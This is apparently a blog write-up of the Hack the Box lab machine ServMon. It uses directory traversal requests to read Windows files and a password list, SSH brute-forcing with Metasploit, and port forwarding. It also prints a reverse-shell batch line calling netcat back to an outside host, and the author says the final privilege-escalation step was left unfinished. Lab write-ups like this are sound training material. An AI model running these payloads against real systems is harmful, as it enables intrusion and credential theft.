+++
author = "Nick"
categories = ["hack the box", "easy", "windows", "NVMS", "LFI", "port forwarding"]
date = 2020-06-20T15:12:26Z
description = ""
draft = false
thumbnail = "/images/2020/06/info-2.png"
slug = "hack-the-box-servmon"
summary = "This is a write-up for the box Servmon. The write-up is 95% complete due to public box's failing to complete the last step >.<"
tags = ["hack the box", "easy", "windows", "NVMS", "LFI", "port forwarding"]
title = "Hack the Box - ServMon"
url = "/hack-the-box-servmon"

+++


Welcome back everyone! Today we are going to be doing the Hack the Box machine - ServMon. This is list as an easy Windows machine. Let's see what's in store!

As usually we start out with our `nmap` scan: `nmap -sC -sV -p- -oA allscan 10.10.10.184`

Here are our results:
```
Nmap scan report for 10.10.10.184
Host is up (0.042s latency).
Not shown: 65517 closed ports
PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_01-18-20  12:05PM       <DIR>          Users
| ftp-syst: 
|_  SYST: Windows_NT
22/tcp    open  ssh           OpenSSH for_Windows_7.7 (protocol 2.0)
| ssh-hostkey: 
|   2048 b9:89:04:ae:b6:26:07:3f:61:89:75:cf:10:29:28:83 (RSA)
|   256 71:4e:6c:c0:d3:6e:57:4f:06:b8:95:3d:c7:75:57:53 (ECDSA)
|_  256 15:38:bd:75:06:71:67:7a:01:17:9c:5c:ed:4c:de:0e (ED25519)
80/tcp    open  http
| fingerprint-strings: 
|   GetRequest, HTTPOptions, RTSPRequest: 
|     HTTP/1.1 200 OK
|     Content-type: text/html
|     Content-Length: 340
|     Connection: close
|     AuthInfo: 
|     <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
|     <html xmlns="http://www.w3.org/1999/xhtml">
|     <head>
|     <title></title>
|     <script type="text/javascript">
|     window.location.href = "Pages/login.htm";
|     </script>
|     </head>
|     <body>
|     </body>
|     </html>
|   NULL: 
|     HTTP/1.1 408 Request Timeout
|     Content-type: text/html
|     Content-Length: 0
|     Connection: close
|_    AuthInfo:
|_http-title: Site doesn't have a title (text/html).
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
5040/tcp  open  unknown
5666/tcp  open  tcpwrapped
6063/tcp  open  tcpwrapped
6699/tcp  open  napster?
7680/tcp  open  pando-pub?
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port80-TCP:V=7.80%I=7%D=5/4%Time=5EB0561A%P=x86_64-pc-linux-gnu%r(NULL,
SF:6B,"HTTP/1\.1\x20408\x20Request\x20Timeout\r\nContent-type:\x20text/htm
SF:l\r\nContent-Length:\x200\r\nConnection:\x20close\r\nAuthInfo:\x20\r\n\
SF:r\n")%r(GetRequest,1B4,"HTTP/1\.1\x20200\x20OK\r\nContent-type:\x20text
SF:/html\r\nContent-Length:\x20340\r\nConnection:\x20close\r\nAuthInfo:\x2
SF:0\r\n\r\n\xef\xbb\xbf<!DOCTYPE\x20html\x20PUBLIC\x20\"-//W3C//DTD\x20XH
SF:TML\x201\.0\x20Transitional//EN\"\x20\"http://www\.w3\.org/TR/xhtml1/DT
SF:D/xhtml1-transitional\.dtd\">\r\n\r\n<html\x20xmlns=\"http://www\.w3\.o
SF:rg/1999/xhtml\">\r\n<head>\r\n\x20\x20\x20\x20<title></title>\r\n\x20\x
SF:20\x20\x20<script\x20type=\"text/javascript\">\r\n\x20\x20\x20\x20\x20\
SF:x20\x20\x20window\.location\.href\x20=\x20\"Pages/login\.htm\";\r\n\x20
SF:\x20\x20\x20</script>\r\n</head>\r\n<body>\r\n</body>\r\n</html>\r\n")%
SF:r(HTTPOptions,1B4,"HTTP/1\.1\x20200\x20OK\r\nContent-type:\x20text/html
SF:\r\nContent-Length:\x20340\r\nConnection:\x20close\r\nAuthInfo:\x20\r\n
SF:\r\n\xef\xbb\xbf<!DOCTYPE\x20html\x20PUBLIC\x20\"-//W3C//DTD\x20XHTML\x
SF:201\.0\x20Transitional//EN\"\x20\"http://www\.w3\.org/TR/xhtml1/DTD/xht
SF:ml1-transitional\.dtd\">\r\n\r\n<html\x20xmlns=\"http://www\.w3\.org/19
SF:99/xhtml\">\r\n<head>\r\n\x20\x20\x20\x20<title></title>\r\n\x20\x20\x2
SF:0\x20<script\x20type=\"text/javascript\">\r\n\x20\x20\x20\x20\x20\x20\x
SF:20\x20window\.location\.href\x20=\x20\"Pages/login\.htm\";\r\n\x20\x20\
SF:x20\x20</script>\r\n</head>\r\n<body>\r\n</body>\r\n</html>\r\n")%r(RTS
SF:PRequest,1B4,"HTTP/1\.1\x20200\x20OK\r\nContent-type:\x20text/html\r\nC
SF:ontent-Length:\x20340\r\nConnection:\x20close\r\nAuthInfo:\x20\r\n\r\n\
SF:xef\xbb\xbf<!DOCTYPE\x20html\x20PUBLIC\x20\"-//W3C//DTD\x20XHTML\x201\.
SF:0\x20Transitional//EN\"\x20\"http://www\.w3\.org/TR/xhtml1/DTD/xhtml1-t
SF:ransitional\.dtd\">\r\n\r\n<html\x20xmlns=\"http://www\.w3\.org/1999/xh
SF:tml\">\r\n<head>\r\n\x20\x20\x20\x20<title></title>\r\n\x20\x20\x20\x20
SF:<script\x20type=\"text/javascript\">\r\n\x20\x20\x20\x20\x20\x20\x20\x2
SF:0window\.location\.href\x20=\x20\"Pages/login\.htm\";\r\n\x20\x20\x20\x
SF:20</script>\r\n</head>\r\n<body>\r\n</body>\r\n</html>\r\n");
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 3m08s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2020-05-04T17:57:08
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon May  4 13:54:25 2020 -- 1 IP address (1 host up) scanned in 351.12 seconds
```

We see that there is something hosted on port 80 as well as anonymous login enabled for our FTP service. So we'll log into the FTP and see what's inside the Users folder we're show in our scan. Once logged in we start pathing through the directory. We get two user names Nathan and Nadine. Inside each of their directories are two files, so we download them to see what might be inside.

![](/images/2020/05/image.png)

We look at the files and see some notes:

![](/images/2020/05/image-1.png)

We know that the service being hosted on port 80 is NVMS. We can do a quick `searchsploit` for NVMS and see there are a few exploits that pop up.

Command:
`searchsploit nvms`

![](/images/2020/05/image-2.png)

We can mirror this last exploit to our working directory with the `-m` flag.

Command:
`searchsploit 48311 -m`

The number 48311 corresponds to the name of the exploit.

![](/images/2020/05/image-3.png)

Once we have the exploit copied, we can [look at the code](https://www.exploit-db.com/exploits/48311). We see it's simply appending our standard traveral and asking for our file to get. Now when I tried to run this in Python, I ran into quite a few errors. I did a minor re-write and was still getting errors. I plan on circling back around to this after this post :). 

Since the traversal is very basic, we can replicate it via `Burpsuite`. We'll use the example that we are given int he PoC from earlier. Here's the request we issue:

```
GET /../../../../../../../../../../../../windows/win.ini HTTP/1.1
Host: 10.10.10.184
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: dataPort=undefined
Upgrade-Insecure-Requests: 1
```

![](/images/2020/05/servmon_burp.gif)

Now that we know this traveral is working, we need to get something of use. We read earlier that there is a Passwords.txt file on Nathan's desktop. This is the file we will get. Here's the request used:

```
GET /../../../../../../../../../../../../../Users/Nathan/Desktop/Passwords.txt HTTP/1.1
Host: 10.10.10.184
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: dataPort=undefined
Upgrade-Insecure-Requests: 1
```

![](/images/2020/05/servmon_burp2.gif)

Now that we have a list of passwords we will save them to a file. Now we try them against NVMS to login as Nadine, Nathan and Admin but none work. The SSH port is open as well so we can try to bruteforce our way into that while we're at it. There are a few ways to do this either the `Metasploit` module for logging in or `Hydra`. In this case I'll use `Metasploit`.

Command:
`msf5> use auxiliary/scanner/ssh/ssh_login`
`msf5> set pass_file passwords`
`msf5> set username Nathan`
`msf5> set rhost 10.10.10.184`

We run the command but nothing shows up, so we change our username value to nadine.

Command:
`msf5> set username nadine`

This comes back with a hit! We could have just put both usernames in a file and supplied that list insead rather than running the module twice.

![](/images/2020/05/image-4.png)

We then SSH in as this user and get our user.txt flag.

![](/images/2020/05/image-5.png)

Once we have that we will start enumerating. We'll spin up a `SimpleHTTPServer` and download `WinPEAS.bat` to the system. I tried a few ways of getting the file over, `certutil`, `powershell` but it ended up being as simple as useing the `-o` flag on the built in `curl` command.

Command:
`curl http://10.10.14.202/winPEAS.bat -o "C:\Temp\win.bat"`

We then run the file. A majority of functions get denied but there is still some usefull information here. We see there is a service running on port 8443 that doesn't match our `nmap` scan.

![](/images/2020/05/image-7.png)

While the rest of the scan runs, we'll head over to port 8443 and see what might be on it. An attempt at getting there via HTTP does not work, HTTPS is required.

![](/images/2020/05/image-8.png)

Nothing seems to be loading on this page however. We do another `searchsploit` for NSClient and come back with a [local windows exploit for escalation](https://www.exploit-db.com/exploits/46802). We see that we can obtain a password from the `nsclient.ini` file or via a command

We run the command to obtain the password: `nscp web password --display`

![](/images/2020/05/image-9.png)

We're also going to look at the ini file for any other useful information. There is one additional piece of information we need inside this file.  The allowed hosts is set to local hosts only.

![](/images/2020/05/image-11.png)

This means we'll need to setup some port forwarding to access the page.

Command:
`ssh -L 9000:127.0.0.1:8443 nadine@10.10.10.184`

Here's a breakdown of the above command if you're new to using it. There's also some additional info [here](https://www.booleanworld.com/guide-ssh-port-forwarding-tunnelling/).

We are telling SSH to map our local (`-L`) port of `9000` to our local machine and forward it to port `8443` on our remote machine. We then supply the credentials of the remote machine - `nadine@10.10.10.184`. So when we open a web browser and go to 127.0.0.1:9000 we should be redirected to the NSClient page as if we were on it locally.

Once we load up the page, we can see the differences:

![](/images/2020/05/sermon_rfwd.gif)

We can now use the password we found earlier (via the command or .ini file) to log in. It looks like we can now follow this PoC and escalate. First we need to create an `evil.bat` file as per the PoC. In this case I'll call my file `rf.bat`. Inside this bat is the follow:

```
@echo off
C:\Temp\nc.exe 10.10.14.202 4444 -e cmd.exe
```

This file simply tells the netcat binary (that we'll put there next) to reach back to us with a command prompt.

Now we need to download the nc.exe file to temp, the same way we copied over the `winPEAS.bat` above.

Command:
`curl http://10.10.14.202/nc.exe -o "C:\Temp\nc.exe"`

Now we setup a listen on our local machine.

Command:
`nc -lvnp 4444`

Now we need to add a script to the NSClient (Step 5 in the PoC). This will call our evil bat file.

![](/images/2020/05/image-14.png)

Now to add to schedule a task to call the script (Step 6).

Now I would have loved to finish this box however this step was pretty close to impossible on public boxes. I don't plan to come back and finish this machine given the bad taste it left.

